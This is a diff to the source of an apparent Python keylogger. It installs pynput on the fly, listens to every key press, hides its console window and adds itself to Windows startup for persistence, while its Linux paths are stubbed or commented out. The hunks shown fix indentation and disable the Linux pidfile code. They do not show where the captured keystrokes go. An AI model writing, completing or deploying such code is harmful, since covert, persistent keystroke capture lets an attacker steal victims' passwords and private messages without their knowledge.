@@ -5,13 +5,13 @@ import threading
 import datetime,time
 from sys import platform
 
-
-
 try:
+    #import pynput
     from pynput import keyboard
     from pynput.keyboard import Key, Controller
 except ImportError:
-    os.system('pip install pynput')
+    os.system('pip install --user pynput')
+    #import pynput
     from pynput import keyboard
     from pynput.keyboard import Key, Controller
 
@@ -35,14 +35,14 @@ if platform == "win32":
         exit(0)
 
 #Settings for linux INCOMPLETE
-if platform == "linux" or platform == "linux2":
-    pid = str(os.getpid())
-    pidfile = "/tmp/mydaemon.pid"
-
-    if os.path.isfile(pidfile):
-        sys.exit()
-    file(pidfile, 'w').write(pid)
-    #os.unlink(pidfile)
+#if platform == "linux" or platform == "linux2":
+#    pid = str(os.getpid())
+#    pidfile = "/tmp/mydaemon.pid"
+#
+#    if os.path.isfile(pidfile):
+#        sys.exit()
+#    file(pidfile, 'w').write(pid)
+#    #os.unlink(pidfile)
 
 
 #Hide Console
@@ -66,7 +66,7 @@ def addStartupWindows():
 
 #Add to startup for linux (INCOMPLETE)
 def addStartupLinux():
-
+    pass
 
 def on_release(key):
     pass
@@ -98,13 +98,13 @@ with keyboard.Listener( on_press=on_press, on_release=on_release) as listener:
 
 
 def main():
-if platform == "win32":
-    hide()
-    addStartupWindows()
-if platform == "linux" or platform == "linux2":
-    addStartupLinux()
-if len(sys.argv)>1:
-    hide()
-    if sys.argv[1]=="startup":
-        addStartup()     
-return True
+    if platform == "win32":
+        hide()
+        addStartupWindows()
+    if platform == "linux" or platform == "linux2":
+        addStartupLinux()
+    if len(sys.argv)>1:
+        hide()
+        if sys.argv[1]=="startup":
+            addStartup()     
+    return True
